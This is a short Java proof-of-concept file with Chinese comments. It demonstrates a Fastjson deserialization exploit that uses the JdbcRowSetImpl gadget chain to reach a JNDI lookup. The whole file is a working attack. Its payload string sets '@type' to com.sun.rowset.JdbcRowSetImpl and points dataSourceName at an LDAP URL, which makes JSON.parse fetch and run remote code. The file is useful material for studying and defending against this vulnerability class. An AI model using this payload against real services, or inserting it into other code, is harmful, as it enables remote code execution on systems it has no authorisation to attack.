import com.alibaba.fastjson.JSON;


/*
* 调用链：
*   JdbcRowSetImpl.setAutoCommit
*       JdbcRowSetImpl.connect
*           InitialContext.lookup
*
* 最后利用的是jndi注入，jdk版本取决于jndi利用版本
* */
public class FastJson_JdbcRowSetImpl {
    public static void main(String[] args) throws Exception{
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/exp\",\"AutoCommit\":true}";
        JSON.parse(payload);
    }
}
